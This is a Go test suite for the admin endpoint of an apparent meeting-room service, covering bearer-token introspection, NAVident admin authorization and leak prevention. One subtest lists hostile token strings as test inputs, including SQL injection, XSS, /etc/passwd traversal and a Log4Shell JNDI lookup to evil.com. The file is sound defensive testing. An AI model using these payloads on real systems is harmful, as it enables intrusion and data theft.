package web

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/navikt/zrooms/internal/models"
	"github.com/navikt/zrooms/internal/repository"
	"github.com/navikt/zrooms/internal/repository/memory"
	"github.com/navikt/zrooms/internal/service"
)

// MockIntrospectionServer creates a test server that simulates the introspection endpoint
type MockIntrospectionServer struct {
	server        *httptest.Server
	validTokens   map[string]bool
	tokenClaims   map[string]map[string]interface{} // token -> claims
	shouldFail    bool
	responseDelay time.Duration
}

func NewMockIntrospectionServer() *MockIntrospectionServer {
	mock := &MockIntrospectionServer{
		validTokens: make(map[string]bool),
		tokenClaims: make(map[string]map[string]interface{}),
	}

	mock.server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Simulate network delay if configured
		if mock.responseDelay > 0 {
			time.Sleep(mock.responseDelay)
		}

		if mock.shouldFail {
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		var req TokenIntrospectionRequest
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "Invalid JSON", http.StatusBadRequest)
			return
		}

		isValid := mock.validTokens[req.Token]
		response := TokenIntrospectionResponse{
			Active: isValid,
		}

		// Add NAVident if token is valid and has claims
		if isValid {
			if claims, exists := mock.tokenClaims[req.Token]; exists {
				if navIdent, ok := claims["NAVident"].(string); ok {
					response.NAVident = navIdent
				}
				if preferredUsername, ok := claims["preferred_username"].(string); ok {
					response.PreferredUsername = preferredUsername
				}
				if sub, ok := claims["sub"].(string); ok {
					response.Sub = sub
				}
			}
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(response)
	}))

	return mock
}

func (m *MockIntrospectionServer) AddValidToken(token string) {
	m.validTokens[token] = true
}

func (m *MockIntrospectionServer) AddValidTokenWithNavIdent(token, navIdent string) {
	m.validTokens[token] = true
	m.tokenClaims[token] = map[string]interface{}{
		"NAVident": navIdent,
	}
}

func (m *MockIntrospectionServer) SetShouldFail(shouldFail bool) {
	m.shouldFail = shouldFail
}

func (m *MockIntrospectionServer) SetResponseDelay(delay time.Duration) {
	m.responseDelay = delay
}

func (m *MockIntrospectionServer) Close() {
	m.server.Close()
}

func (m *MockIntrospectionServer) URL() string {
	return m.server.URL
}

// Test helper to create admin handler with mocked dependencies
func createTestAdminHandler(introspectionURL string) (*TestAdminHandler, func()) {
	// Set environment variable
	oldEnv := os.Getenv("NAIS_TOKEN_INTROSPECTION_ENDPOINT")
	os.Setenv("NAIS_TOKEN_INTROSPECTION_ENDPOINT", introspectionURL)

	// Create test dependencies
	repo := memory.NewRepository()
	meetingService := service.NewMeetingService(repo)

	// Add some test data
	ctx := context.Background()
	testMeeting := &models.Meeting{
		ID:     "test-meeting-123",
		Topic:  "Test Meeting",
		Status: models.MeetingStatusStarted,
		Host: models.Participant{
			ID:    "host-123",
			Email: "test-host@example.com",
			Name:  "Test Host",
		},
	}
	repo.SaveMeeting(ctx, testMeeting)
	repo.AddParticipantToMeeting(ctx, "test-meeting-123", "participant1")
	repo.AddParticipantToMeeting(ctx, "test-meeting-123", "participant2")

	handler := &TestAdminHandler{
		meetingService: meetingService,
		repo:           repo,
	}

	cleanup := func() {
		os.Setenv("NAIS_TOKEN_INTROSPECTION_ENDPOINT", oldEnv)
	}

	return handler, cleanup
}

// TestAdminHandler is a simplified admin handler for testing
type TestAdminHandler struct {
	meetingService *service.MeetingService
	repo           repository.Repository
}

func (h *TestAdminHandler) SetupAdminRoutes(mux *http.ServeMux) {
	auth := NewAuthMiddleware()
	mux.HandleFunc("/admin", auth.RequireAuth(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("Admin Dashboard"))
	}))
	mux.HandleFunc("/admin/meetings", auth.RequireAuth(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("Admin Meetings"))
	}))
	mux.HandleFunc("/admin/meetings/", auth.RequireAuth(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("Meeting Detail"))
	}))
}

// Security Test Suite
func TestAdminSecurityTests(t *testing.T) {
	mock := NewMockIntrospectionServer()
	defer mock.Close()

	validToken := "valid-token-12345"
	authorizedNavIdent := "ADMIN123"
	mock.AddValidTokenWithNavIdent(validToken, authorizedNavIdent)

	// Set up authorized admin list
	oldAdminEnv := os.Getenv("NAV_IDENT_ADMINS")
	os.Setenv("NAV_IDENT_ADMINS", "ADMIN123,ADMIN456")
	defer func() {
		if oldAdminEnv != "" {
			os.Setenv("NAV_IDENT_ADMINS", oldAdminEnv)
		} else {
			os.Unsetenv("NAV_IDENT_ADMINS")
		}
	}()

	handler, cleanup := createTestAdminHandler(mock.URL())
	defer cleanup()

	mux := http.NewServeMux()
	handler.SetupAdminRoutes(mux)

	t.Run("Unauthorized Access Attempts", func(t *testing.T) {
		testCases := []struct {
			name             string
			path             string
			method           string
			headers          map[string]string
			expectedStatus   int
			shouldContain    []string
			shouldNotContain []string
		}{
			{
				name:             "No Authorization Header",
				path:             "/admin",
				method:           "GET",
				expectedStatus:   http.StatusUnauthorized,
				shouldContain:    []string{"Authorization header required"},
				shouldNotContain: []string{"Meeting", "Dashboard", "test-meeting"},
			},
			{
				name:             "Empty Authorization Header",
				path:             "/admin",
				method:           "GET",
				headers:          map[string]string{"Authorization": ""},
				expectedStatus:   http.StatusUnauthorized,
				shouldContain:    []string{"Authorization header required"},
				shouldNotContain: []string{"Meeting", "Dashboard"},
			},
			{
				name:             "Invalid Authorization Type",
				path:             "/admin",
				method:           "GET",
				headers:          map[string]string{"Authorization": "Basic dGVzdA=="},
				expectedStatus:   http.StatusUnauthorized,
				shouldContain:    []string{"Bearer token required"},
				shouldNotContain: []string{"Meeting", "Dashboard"},
			},
			{
				name:             "Bearer Without Token",
				path:             "/admin",
				method:           "GET",
				headers:          map[string]string{"Authorization": "Bearer"},
				expectedStatus:   http.StatusUnauthorized,
				shouldContain:    []string{"Bearer token required"},
				shouldNotContain: []string{"Meeting", "Dashboard"},
			},
			{
				name:             "Bearer With Empty Token",
				path:             "/admin",
				method:           "GET",
				headers:          map[string]string{"Authorization": "Bearer "},
				expectedStatus:   http.StatusUnauthorized,
				shouldContain:    []string{"Token cannot be empty"},
				shouldNotContain: []string{"Meeting", "Dashboard"},
			},
			{
				name:             "Invalid Token",
				path:             "/admin",
				method:           "GET",
				headers:          map[string]string{"Authorization": "Bearer invalid-token"},
				expectedStatus:   http.StatusUnauthorized,
				shouldContain:    []string{"Invalid token"},
				shouldNotContain: []string{"Meeting", "Dashboard", "test-meeting"},
			},
		}

		for _, tc := range testCases {
			t.Run(tc.name, func(t *testing.T) {
				req := httptest.NewRequest(tc.method, tc.path, nil)
				for key, value := range tc.headers {
					req.Header.Set(key, value)
				}

				w := httptest.NewRecorder()
				mux.ServeHTTP(w, req)

				if w.Code != tc.expectedStatus {
					t.Errorf("Expected status %d, got %d", tc.expectedStatus, w.Code)
				}

				body := w.Body.String()
				for _, shouldContain := range tc.shouldContain {
					if !strings.Contains(body, shouldContain) {
						t.Errorf("Response should contain '%s', but got: %s", shouldContain, body)
					}
				}

				for _, shouldNotContain := range tc.shouldNotContain {
					if strings.Contains(body, shouldNotContain) {
						t.Errorf("Response should NOT contain '%s', but got: %s", shouldNotContain, body)
					}
				}
			})
		}
	})

	t.Run("Information Disclosure Prevention", func(t *testing.T) {
		testCases := []struct {
			name    string
			path    string
			headers map[string]string
		}{
			{
				name: "Admin Dashboard",
				path: "/admin",
			},
			{
				name: "Meetings List",
				path: "/admin/meetings",
			},
			{
				name: "Specific Meeting",
				path: "/admin/meetings/test-meeting-123",
			},
			{
				name: "Non-existent Meeting",
				path: "/admin/meetings/non-existent",
			},
		}

		for _, tc := range testCases {
			t.Run(tc.name, func(t *testing.T) {
				req := httptest.NewRequest("GET", tc.path, nil)
				req.Header.Set("Authorization", "Bearer invalid-token")

				w := httptest.NewRecorder()
				mux.ServeHTTP(w, req)

				body := w.Body.String()

				// Ensure no sensitive information is leaked
				sensitiveInfo := []string{
					"test-meeting-123",
					"Test Meeting",
					"test-host@example.com",
					"participant1",
					"participant2",
					"Dashboard Overview",
					"Total Meetings",
					"Active Meetings",
				}

				for _, info := range sensitiveInfo {
					if strings.Contains(body, info) {
						t.Errorf("Unauthorized response contains sensitive information: %s", info)
					}
				}
			})
		}
	})

	t.Run("HTTP Method Security", func(t *testing.T) {
		methods := []string{"GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"}

		for _, method := range methods {
			t.Run(fmt.Sprintf("Method_%s", method), func(t *testing.T) {
				req := httptest.NewRequest(method, "/admin", nil)
				// No authorization header

				w := httptest.NewRecorder()
				mux.ServeHTTP(w, req)

				// All methods should require authorization
				if w.Code != http.StatusUnauthorized {
					t.Errorf("Method %s should return 401, got %d", method, w.Code)
				}

				body := w.Body.String()
				if strings.Contains(body, "Dashboard") || strings.Contains(body, "Meeting") {
					t.Errorf("Method %s leaked admin information without auth", method)
				}
			})
		}
	})

	t.Run("Token Injection Attacks", func(t *testing.T) {
		maliciousTokens := []string{
			"'; DROP TABLE meetings; --",
			"<script>alert('xss')</script>",
			"../../../etc/passwd",
			"${jndi:ldap://evil.com/a}",
			"{{7*7}}",
			"Bearer nested-bearer-token",
			strings.Repeat("A", 10000), // Very long token
			"token\nwith\nnewlines",
			"token\x00with\x00nulls",
		}

		for i, token := range maliciousTokens {
			t.Run(fmt.Sprintf("MaliciousToken_%d", i), func(t *testing.T) {
				req := httptest.NewRequest("GET", "/admin", nil)
				req.Header.Set("Authorization", "Bearer "+token)

				w := httptest.NewRecorder()
				mux.ServeHTTP(w, req)

				// Should not crash and should return proper error
				if w.Code != http.StatusUnauthorized && w.Code != http.StatusInternalServerError {
					t.Errorf("Malicious token should result in 401 or 500, got %d", w.Code)
				}

				body := w.Body.String()
				// Should not contain admin information
				if strings.Contains(body, "Dashboard") || strings.Contains(body, "test-meeting") {
					t.Errorf("Malicious token leaked admin information")
				}
			})
		}
	})

	t.Run("Introspection Endpoint Failures", func(t *testing.T) {
		t.Run("Introspection Server Down", func(t *testing.T) {
			mock.SetShouldFail(true)
			defer mock.SetShouldFail(false)

			req := httptest.NewRequest("GET", "/admin", nil)
			req.Header.Set("Authorization", "Bearer "+validToken)

			w := httptest.NewRecorder()
			mux.ServeHTTP(w, req)

			if w.Code != http.StatusInternalServerError {
				t.Errorf("Expected 500 when introspection fails, got %d", w.Code)
			}

			body := w.Body.String()
			if strings.Contains(body, "Dashboard") {
				t.Errorf("Should not show admin content when introspection fails")
			}
		})
	})

	t.Run("Valid Authentication", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/admin", nil)
		req.Header.Set("Authorization", "Bearer "+validToken)

		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Errorf("Expected 200 with valid token, got %d", w.Code)
		}

		body := w.Body.String()
		if !strings.Contains(body, "Dashboard") {
			t.Errorf("Valid token should show admin dashboard")
		}
	})
}

// Test NAVident authorization
func TestNAVIdentAuthorization(t *testing.T) {
	mock := NewMockIntrospectionServer()
	defer mock.Close()

	// Test setup
	validToken := "valid-token-with-navident"
	unauthorizedNavIdent := "T123456"
	authorizedNavIdent := "A987654"

	mock.AddValidTokenWithNavIdent(validToken, unauthorizedNavIdent)

	// Set up authorized admin list
	oldAdminEnv := os.Getenv("NAV_IDENT_ADMINS")
	os.Setenv("NAV_IDENT_ADMINS", "A987654,B123456,C789012")
	defer func() {
		if oldAdminEnv != "" {
			os.Setenv("NAV_IDENT_ADMINS", oldAdminEnv)
		} else {
			os.Unsetenv("NAV_IDENT_ADMINS")
		}
	}()

	handler, cleanup := createTestAdminHandler(mock.URL())
	defer cleanup()

	mux := http.NewServeMux()
	handler.SetupAdminRoutes(mux)

	t.Run("Unauthorized NAVident", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/admin", nil)
		req.Header.Set("Authorization", "Bearer "+validToken)

		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)

		if w.Code != http.StatusForbidden {
			t.Errorf("Expected 403 for unauthorized NAVident, got %d", w.Code)
		}

		body := w.Body.String()
		if !strings.Contains(body, "Access denied") {
			t.Errorf("Expected 'Access denied' message, got: %s", body)
		}
	})

	t.Run("Authorized NAVident", func(t *testing.T) {
		// Add token with authorized NAVident
		authorizedToken := "authorized-token"
		mock.AddValidTokenWithNavIdent(authorizedToken, authorizedNavIdent)

		req := httptest.NewRequest("GET", "/admin", nil)
		req.Header.Set("Authorization", "Bearer "+authorizedToken)

		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Errorf("Expected 200 for authorized NAVident, got %d", w.Code)
		}

		body := w.Body.String()
		if !strings.Contains(body, "Admin Dashboard") {
			t.Errorf("Expected 'Admin Dashboard', got: %s", body)
		}
	})

	t.Run("Missing NAVident Claim", func(t *testing.T) {
		// Add token without NAVident claim
		tokenWithoutNavIdent := "token-without-navident"
		mock.AddValidToken(tokenWithoutNavIdent)

		req := httptest.NewRequest("GET", "/admin", nil)
		req.Header.Set("Authorization", "Bearer "+tokenWithoutNavIdent)

		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)

		if w.Code != http.StatusForbidden {
			t.Errorf("Expected 403 for missing NAVident, got %d", w.Code)
		}
	})

	t.Run("Empty Admin List", func(t *testing.T) {
		// Temporarily unset admin list
		os.Unsetenv("NAV_IDENT_ADMINS")

		authorizedToken := "test-token"
		mock.AddValidTokenWithNavIdent(authorizedToken, "any-navident")

		req := httptest.NewRequest("GET", "/admin", nil)
		req.Header.Set("Authorization", "Bearer "+authorizedToken)

		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)

		if w.Code != http.StatusForbidden {
			t.Errorf("Expected 403 when no admins configured, got %d", w.Code)
		}

		// Restore admin list
		os.Setenv("NAV_IDENT_ADMINS", "A987654,B123456,C789012")
	})

	t.Run("Admin List with Whitespace", func(t *testing.T) {
		// Test admin list with various whitespace
		os.Setenv("NAV_IDENT_ADMINS", " A987654 , B123456,  C789012  ")

		authorizedToken := "whitespace-test-token"
		mock.AddValidTokenWithNavIdent(authorizedToken, "B123456")

		req := httptest.NewRequest("GET", "/admin", nil)
		req.Header.Set("Authorization", "Bearer "+authorizedToken)

		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Errorf("Expected 200 for admin with whitespace handling, got %d", w.Code)
		}
	})
}

func TestNoIntrospectionEndpointConfigured(t *testing.T) {
	// Test without setting introspection endpoint
	oldEnv := os.Getenv("NAIS_TOKEN_INTROSPECTION_ENDPOINT")
	os.Unsetenv("NAIS_TOKEN_INTROSPECTION_ENDPOINT")
	defer func() {
		if oldEnv != "" {
			os.Setenv("NAIS_TOKEN_INTROSPECTION_ENDPOINT", oldEnv)
		}
	}()

	handler, cleanup := createTestAdminHandler("")
	defer cleanup()

	mux := http.NewServeMux()
	handler.SetupAdminRoutes(mux)

	req := httptest.NewRequest("GET", "/admin", nil)
	req.Header.Set("Authorization", "Bearer any-token")

	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusServiceUnavailable {
		t.Errorf("Expected 503 when introspection endpoint not configured, got %d", w.Code)
	}

	body := w.Body.String()
	if strings.Contains(body, "Dashboard") {
		t.Errorf("Should not show admin content when auth not configured")
	}
}

func TestRateLimitingProtection(t *testing.T) {
	mock := NewMockIntrospectionServer()
	defer mock.Close()

	handler, cleanup := createTestAdminHandler(mock.URL())
	defer cleanup()

	mux := http.NewServeMux()
	handler.SetupAdminRoutes(mux)

	// Simulate rapid requests with invalid tokens
	for i := 0; i < 100; i++ {
		req := httptest.NewRequest("GET", "/admin", nil)
		req.Header.Set("Authorization", fmt.Sprintf("Bearer invalid-token-%d", i))

		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)

		// Should consistently return 401 and not crash
		if w.Code != http.StatusUnauthorized {
			t.Errorf("Request %d: Expected 401, got %d", i, w.Code)
		}
	}
}

// Benchmark to ensure performance doesn't degrade with invalid tokens
func BenchmarkInvalidTokens(b *testing.B) {
	mock := NewMockIntrospectionServer()
	defer mock.Close()

	handler, cleanup := createTestAdminHandler(mock.URL())
	defer cleanup()

	mux := http.NewServeMux()
	handler.SetupAdminRoutes(mux)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		req := httptest.NewRequest("GET", "/admin", nil)
		req.Header.Set("Authorization", fmt.Sprintf("Bearer invalid-token-%d", i))

		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)
	}
}
